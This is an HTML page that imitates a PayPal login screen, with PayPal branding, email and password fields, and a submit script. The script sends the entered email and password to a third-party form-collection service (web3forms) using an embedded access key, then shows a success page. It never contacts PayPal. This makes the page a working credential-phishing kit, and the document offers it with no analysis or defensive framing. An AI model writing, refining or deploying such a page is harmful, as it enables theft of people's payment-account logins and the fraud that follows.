<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your Paypal account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .forgot-password {
            color: #0070ba;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #0070ba;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .separator {
            margin: 20px 0;
            display: flex;
            align-items: center;
        }
        .separator::before, .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #ccc;
        }
        .separator-text {
            padding: 0 10px;
            color: #666;
        }
        .signup-button {
            width: 100%;
            padding: 10px;
            border: 1px solid #0070ba;
            color: #0070ba;
            background-color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); 

            const formData = new FormData(event.target);

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (result.success) {
                    window.location.href = "success.html";
                } else {
                    alert("Error submitting form. Please try again.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("There was an error submitting the form.");
            });
        }
    </script>
    <link rel="shortcut icon" type="img/png/gif" href="paypallogo.png">
</head>
<body>
    <div class="login-container">
        <img src="paypallogo.png" alt="PayPal Logo" class="logo" width="50">
        <form onsubmit="handleSubmit(event)">
            <input type="hidden" name="access_key" value="73a8168d-ab19-476e-8d69-ca24c6378eae">
            <input type="email" class="input-field" name="email" placeholder="Email or mobile number" required>
            <input type="password" class="input-field" name="pword" placeholder="Enter your password" required>
            <a href="#" class="forgot-password">Forgot password?</a>
            <button type="submit" class="login-button">Log In</button>
        </form>
        <div class="separator">
            <span class="separator-text">or</span>
        </div>
        <button class="signup-button">Sign Up</button>
    </div>
</body>
</html>
